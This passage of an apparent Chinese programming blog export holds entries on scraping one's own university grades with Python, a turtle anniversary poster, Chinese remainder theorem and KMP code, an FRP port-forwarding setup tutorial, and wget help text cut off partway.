form[&#x27;zjh&#x27;] = input()</span></span><br><span class="line"><span class="comment"># form[&#x27;mm&#x27;] = input()</span></span><br><span class="line">form[<span class="string">&#x27;zjh&#x27;</span>] = form[<span class="string">&#x27;mm&#x27;</span>] = input()</span><br><span class="line">form[<span class="string">&#x27;v_yzm&#x27;</span>] = input()</span><br><span class="line">os.remove(<span class="string">&#x27;tmp.jpg&#x27;</span>)</span><br><span class="line">req = session.post(host + <span class="string">&#x27;/loginAction.do&#x27;</span>, data=form, headers=headers)</span><br><span class="line"></span><br><span class="line">req = session.get(host + <span class="string">&#x27;/gradeLnAllAction.do?oper=qbinfo&#x27;</span>)</span><br><span class="line">soup = BeautifulSoup(req.content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">soup = soup.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">soup = soup.replace(<span class="string">&#x27;/css/newcss/&#x27;</span>,<span class="string">&#x27;http://218.196.240.97/css/newcss/&#x27;</span>)</span><br><span class="line">fb = open(<span class="string">&#x27;index.html&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fb.write(soup.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">fb.close()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python绘制校庆宣传画</title>
    <url>/post/9ae2a58f/</url>
    <content><![CDATA[<blockquote>
<p>Python作业，用turtle绘制校庆宣传画。</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_line</span>(<span class="params">angle, length</span>):</span></span><br><span class="line">    turtle.pendown()</span><br><span class="line">    turtle.seth(angle)</span><br><span class="line">    turtle.forward(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span>(<span class="params">x, y, extend=None</span>):</span></span><br><span class="line">    startx, starty = <span class="number">-100</span>, <span class="number">200</span></span><br><span class="line">    <span class="keyword">if</span> extend:</span><br><span class="line">        extend.penup()</span><br><span class="line">        extend.goto(startx + x, starty - y)</span><br><span class="line">        extend.pendown()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        turtle.penup()</span><br><span class="line">        turtle.goto(startx + x, starty - y)</span><br><span class="line">        turtle.pendown()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_xq</span>():</span></span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    turtle.pensize(<span class="number">1</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    locate(<span class="number">96</span>, <span class="number">1</span>)</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">15</span>)</span><br><span class="line">    locate(<span class="number">120</span>, <span class="number">28</span>)</span><br><span class="line">    turtle.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    turtle.begin_fill()</span><br><span class="line">    turtle.seth(<span class="number">120</span>)</span><br><span class="line">    turtle.circle(<span class="number">27</span>, <span class="number">120</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">53</span>)</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">155</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">150</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">155</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">53</span>)</span><br><span class="line">    turtle.end_fill()</span><br><span class="line">    locate(<span class="number">10</span>, <span class="number">53</span>)</span><br><span class="line">    turtle.pensize(<span class="number">6</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">170</span>)</span><br><span class="line">    locate(<span class="number">20</span>, <span class="number">82</span>)</span><br><span class="line">    turtle.pensize(<span class="number">8</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">170</span>, <span class="number">82</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">30</span>)</span><br><span class="line">    locate(<span class="number">96</span>, <span class="number">185</span>)</span><br><span class="line">    turtle.pensize(<span class="number">50</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">70</span>)</span><br><span class="line">    turtle.pensize(<span class="number">12</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    locate(<span class="number">60</span>, <span class="number">125</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line">    locate(<span class="number">60</span>, <span class="number">178</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line">    turtle.pensize(<span class="number">1</span>)</span><br><span class="line">    locate(<span class="number">10</span>, <span class="number">188</span>)</span><br><span class="line">    turtle.begin_fill()</span><br><span class="line">    draw_line(<span class="number">270</span>, <span class="number">18</span>)</span><br><span class="line">    draw_line(<span class="number">240</span>, <span class="number">24</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    draw_line(<span class="number">240</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">88</span>)</span><br><span class="line">    draw_line(<span class="number">120</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    draw_line(<span class="number">120</span>, <span class="number">24</span>)</span><br><span class="line">    draw_line(<span class="number">90</span>, <span class="number">18</span>)</span><br><span class="line">    draw_line(<span class="number">180</span>, <span class="number">169</span>)</span><br><span class="line">    turtle.end_fill()</span><br><span class="line">    turtle.pensize(<span class="number">4</span>)</span><br><span class="line">    turtle.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    locate(<span class="number">8</span>, <span class="number">208</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">58</span>)</span><br><span class="line">    draw_line(<span class="number">60</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">53</span>)</span><br><span class="line">    draw_line(<span class="number">300</span>, <span class="number">9</span>)</span><br><span class="line">    draw_line(<span class="number">0</span>, <span class="number">58</span>)</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    font = turtle.Turtle()</span><br><span class="line">    locate(<span class="number">43</span>, <span class="number">265</span>, font)</span><br><span class="line">    font.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    font.write(<span class="string">&#x27;1909-2019&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_word</span>():</span></span><br><span class="line">    font = turtle.Turtle()</span><br><span class="line">    locate(<span class="number">-186</span>, <span class="number">350</span>, font)</span><br><span class="line">    font.pencolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">    font.write(<span class="string">&#x27;河南理工大学建校110周年&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">36</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    locate(<span class="number">-180</span>, <span class="number">380</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY&#x27;</span>, font=(<span class="string">&#x27;Aria&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.color(<span class="number">200</span>/<span class="number">255</span>, <span class="number">166</span>/<span class="number">255</span>, <span class="number">92</span>/<span class="number">255</span>)</span><br><span class="line">    locate(<span class="number">300</span>, <span class="number">100</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;好学力行&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    locate(<span class="number">-250</span>, <span class="number">200</span>, font)</span><br><span class="line">    font.write(<span class="string">&#x27;明德任责&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    font.hideturtle()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    width, height = <span class="number">800</span>, <span class="number">600</span></span><br><span class="line">    turtle.screensize(bg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    turtle.setup(width, height, <span class="number">400</span>, <span class="number">100</span>)</span><br><span class="line">    turtle.speed(<span class="number">10</span>)</span><br><span class="line">    draw_xq()</span><br><span class="line">    draw_word()</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong>效果如下：</strong><br><img data-src="https://cdn.file.todest.cn/pic/2019101401.jpg" alt=""></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>turtle</tag>
      </tags>
  </entry>
  <entry>
    <title>中国剩余定理</title>
    <url>/post/2cf738e6/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未完待续</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>未完待续<br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">ll yu[<span class="number">120</span>],chu[<span class="number">120</span>];</span><br><span class="line"><span class="function">ll <span class="title">exgcd</span><span class="params">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ll res=exgcd(b,a%b,y,x);</span><br><span class="line">        y-=x*(a/b);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">china</span><span class="params">(<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll d,x,y,m,n=<span class="number">1</span>,ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l;i++)</span><br><span class="line">        n*=chu[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        m=n/chu[i];</span><br><span class="line">        d=exgcd(chu[i],m,x,y);</span><br><span class="line">        ret=(ret+y*m*yu[i])%n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (n+ret%n)%n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;chu[i]&gt;&gt;yu[i];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;china(N)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>中国剩余定理</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透</title>
    <url>/post/bd50b816/</url>
    <content><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>&emsp;&emsp;<strong>端口映射</strong>就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。<br>&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。</p>
<p>&emsp;&emsp;<strong>内网穿透</strong>，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
<a id="more"></a>
<h1 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h1><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。</p>
<h3 id="下载frp"><a href="#下载frp" class="headerlink" title="下载frp"></a>下载frp</h3><blockquote>
<p>frp项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
</blockquote>
<p>进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。<br>这里以linux（服务器），windows(客户端)为例。</p>
<h3 id="linux服务器上配置"><a href="#linux服务器上配置" class="headerlink" title="linux服务器上配置"></a>linux服务器上配置</h3><p>下载并解压文件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line">tar xzvf frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 可以给文件夹改个短点的名字</span></span><br><span class="line">mv frp_0.29.0_linux_amd64 frp</span><br></pre></td></tr></table></figure><br>配置服务端frp配置文件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> frp</span><br><span class="line">vim frps.ini</span><br></pre></td></tr></table></figure><br>按 $I$ 键进入插入模式，输入以下内容。<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span>  <span class="comment"># 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span>  <span class="comment"># 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。</span></span><br></pre></td></tr></table></figure><br>按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。<br>至此，服务端已配置完毕，接下来运行即可。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini <span class="comment"># 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。</span></span><br><span class="line">nohup ./frps -c frps.ini <span class="comment"># 放到后台运行，服务器重启需重新执行。</span></span><br></pre></td></tr></table></figure><br>以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure><br>写入以下内容。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;frps daemon    # 服务名称，随便填写即可</span><br><span class="line">After&#x3D;syslog.target  network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">ExecStart&#x3D;&#x2F;root&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;frp&#x2F;frps.ini   # 修改为你的frps的绝对路径</span><br><span class="line">Restart&#x3D; always</span><br><span class="line">RestartSec&#x3D;1min</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><br>启动服务，并设置开及自动运行。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload        <span class="comment"># 重新加载服务</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> frps.service  <span class="comment"># 开机自启</span></span><br><span class="line">sudo systemctl start frps           <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure></p>
<h3 id="windows客户端上配置"><a href="#windows客户端上配置" class="headerlink" title="windows客户端上配置"></a>windows客户端上配置</h3><p>配置客户端frp配置文件，编辑 frpc.ini。<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span>  <span class="comment"># 服务器IP地址或域名</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span>     <span class="comment"># 服务器监听端口</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mc]</span>   <span class="comment"># 此处名称随意</span></span><br><span class="line"><span class="attr">type</span> = tcp  <span class="comment"># 协议类型，如udp，http，https，stpx，xtcp</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">25565</span>       <span class="comment"># 本地监听端口</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">25565</span>      <span class="comment"># 服务器转发端口</span></span><br><span class="line"><span class="attr">custom_domains</span> = domain  <span class="comment"># 服务器域名</span></span><br></pre></td></tr></table></figure><br>至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\frpc -c frpc.ini</span><br></pre></td></tr></table></figure><br>运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。<br>接下来就可以愉快的玩耍了。</p>
<p><strong>注：详细配置文件参照frps_full.ini和frpc_full.ini</strong></p>
<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h3><blockquote>
<p>官网：<a href="https://hsk.oray.com">https://hsk.oray.com</a></p>
</blockquote>
<p>一次性付费开通服务，1Mbps带宽，每月1G流量。</p>
<h3 id="蒲公英"><a href="#蒲公英" class="headerlink" title="蒲公英"></a>蒲公英</h3><blockquote>
<p>官网：<a href="https://pgy.oray.com">https://pgy.oray.com</a></p>
</blockquote>
<p>免费，仅限三人互相访问，1Mbps带宽。</p>
<p><strong>还有其他免费平台自行百度即可，此处就不多赘述。</strong></p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>端口映射</tag>
      </tags>
  </entry>
  <entry>
    <title>剪花布条</title>
    <url>/post/8da1c66a/</url>
    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>一块花布条，里面有些图案，另有一块直接可用的小饰条，里面也有一些图案。对于给定的花布条和小饰条，计算一下能从花布条中尽可能剪出几块小饰条来呢？</p>
</blockquote>
<a id="more"></a>
<h1 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h1><blockquote><p>输入中含有一些数据，分别是成对出现的花布条和小饰条，其布条都是用可见ASCII字符表示的，可见的ASCII字符有多少个，布条的花纹也有多少种花样。花纹条和小饰条不会超过1000个字符长。如果遇见#字符，则不再进行工作。</p>
</blockquote>
<h1 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h1><blockquote><p>输出能从花纹布中剪出的最多小饰条个数，如果一块都没有，那就老老实实输出0，每个结果之间应换行。</p>
</blockquote>
<h1 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abcde a3</span><br><span class="line">aaaaaa  aa</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<h1 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a,b;</span><br><span class="line"><span class="keyword">int</span> NEXT[<span class="number">1020</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">-1</span>;</span><br><span class="line">    NEXT[i]=j;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;b.length())&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||b[i]==b[j])&#123;</span><br><span class="line">            i++;j++;</span><br><span class="line">            NEXT[i]=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=NEXT[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    get();</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;a.length())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||a[i]==b[j])</span><br><span class="line">        &#123;</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(j==b.length())</span><br><span class="line">            &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=NEXT[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[<span class="number">0</span>]==<span class="string">&#x27;#&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;kmp()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Wget命令解释</title>
    <url>/post/2640927a/</url>
    <content><![CDATA[<h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><p>GNU Wget 1.11.4，非交互式的网络文件下载工具。<br>用法： wget [选项]… [URL]…<br>Mandatory arguments to long options are mandatory for short options too.</p>
<h2 id="Wget-for-Windows"><a href="#Wget-for-Windows" class="headerlink" title="Wget for Windows"></a>Wget for Windows</h2><p>官网：<a href="http://gnuwin32.sourceforge.net/packages/wget.htm">http://gnuwin32.sourceforge.net/packages/wget.htm</a><br>下载地址：<a href="http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe">http://downloads.sourceforge.net/gnuwin32/wget-1.11.4-1-setup.exe</a><br><a id="more"></a></p>
<h2 id="Wget-—-—help"><a href="#Wget-—-—help" class="headerlink" title="Wget — —help"></a>Wget — —help</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">Startup:</span><br><span class="line">  -V,  --version           display the version of Wget <span class="keyword">and</span> exit.</span><br><span class="line">  -h,  --help              print this help.</span><br><span class="line">  -b,  --background        go to background after startup.</span><br><span class="line">  -e,  --execute=<span class="keyword">COMMAND</span>   execute a `.wgetrc&#x27;-style <span class="keyword">command</span>.</span><br><span class="line"></span><br><span class="line">Logging <span class="keyword">and</span> input <span class="keyword">file</span>:</span><br><span class="line">  -o,  --output-<span class="keyword">file</span>=<span class="keyword">FILE</span>    log messages to <span class="keyword">FILE</span>.</span><br><span class="line">  -a,  --append-output=<span class="keyword">FILE</span>  append messages to <span class="keyword">FILE</span>.</span><br><span class="line">  -d,  --debug               print lots of debugging information.</span><br><span class="line">  -q,  --quiet               quiet (no output).</span><br><span class="line">  -v,  --verbose             be verbose (this is the default).</span><br><span class="line">  -nv, --no-verbose          turn <span class="keyword">off</span> verboseness, without being quiet.</span><br><span class="line">  -i,  --input-<span class="keyword">file</span>=<span class="keyword">FILE</span>     download URLs found in <span class="keyword">FILE</span>.</span><br><span class="line">  -F,  --force-html          treat input <span class="keyword">file</span> as HTML.</span><br><span class="line">  -B,  --base=URL            prepends URL to relative links in -F -i <span class="keyword">file</span>.</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line">  -t,  --tries=NUMBER            <span class="keyword">set</span> number of retries to NUMBER (<span class="number">0</span> unlimits).</span><br><span class="line">       --retry-connrefused       retry even <span class="keyword">if</span> connection is refused.</span><br><span class="line">  -O,  --output-document=<span class="keyword">FILE</span>    write documents to <span class="keyword">FILE</span>.</span><br><span class="line">  -nc, --no-clobber              skip downloads that would download to</span><br><span class="line">                                 existing files.</span><br><span class="line">  -c,  --<span class="keyword">continue</span>                resume getting a partially-downloaded <span class="keyword">file</span>.</span><br><span class="line">       --progress=TYPE           select progress gauge type.</span><br><span class="line">  -N,  --timestamping            don&#x27;t re-retrieve files unless newer than</span><br><span class="line">                                 local.</span><br><span class="line">  -S,  --server-response         print server response.</span><br><span class="line">       --spider                  don&#x27;t download anything.</span><br><span class="line">  -T,  --timeout=SECONDS         <span class="keyword">set</span> all timeout values to SECONDS.</span><br><span class="line">       --dns-timeout=SECS        <span class="keyword">set</span> the DNS lookup timeout to SECS.</span><br><span class="line">       --connect-timeout=SECS    <span class="keyword">set</span> the connect timeout to SECS.</span><br><span class="line">       --read-timeout=SECS       <span class="keyword">set</span> the read timeout to SECS.</span><br><span class="line">  -w,  --wait=SECONDS            wait SECONDS between retrievals.</span><br><span class="line">       --waitretry=SECONDS       wait <span class="number">1</span>..SECONDS between retries of a retrieval.</span><br><span class="line">       --random-wait             wait from <span class="number">0</span>...<span class="number">2</span>*WAIT secs between retrievals.</span><br><span class="line">       --no-proxy                explicitly turn <span class="keyword">off</span> proxy.</span><br><span class="line">  -Q,  --quota=NUMBER            <span class="keyword">set</span> retrieval quota to NUMBER.</span><br><span class="line">       --bind-address=ADDRESS    bind to ADDRESS (hostname <span class="keyword">or</span> IP) <span class="keyword">on</span> local host.</span><br><span class="line">       --limit-rate=RATE         limit download rate to RATE.</span><br><span class="line">       --no-dns-cache            disable caching DNS lookups.</span><br><span class="line">       --restrict-<span class="keyword">file</span>-names=OS  restrict chars in <span class="keyword">file</span> names to ones OS allows.</span><br><span class="line">       --ignore-case             ignore case when matching files/directories.</span><br><span class="line">  -<span class="number">4</span>,  --inet4-only              connect only to IPv4 addresses.</span><br><span class="line">  -<span class="number">6</span>,  --inet6-only              connect only to IPv6 addresses.</span><br><span class="line">       --prefer-family=FAMILY    connect first to addresses of specified family,</span><br><span class="line">                                 one of IPv6, IPv4, <span class="keyword">or</span> none.</span><br><span class="line">       --user=USER               <span class="keyword">set</span> both ftp <span class="keyword">and</span> http user to USER.</span><br><span class="line">       --password=PASS           <span class="keyword">set</span> both ftp <span class="keyword">and</span> http password to PASS.</span><br><span class="line"></span><br><span class="line">Directories:</span><br><span class="line">  -nd, --no-directories           don&#x27;t create directories.</span><br><span class="line">  -x,  --force-directories        force creation of directories.</span><br><span class="line">  -nH, --no-host-directories      don&#x27;t create host directories.</span><br><span class="line">       --protocol-directories     use protocol name in directories.</span><br><span class="line">  -P,  --directory-prefix=PREFIX  save files to PREFIX/...</span><br><span 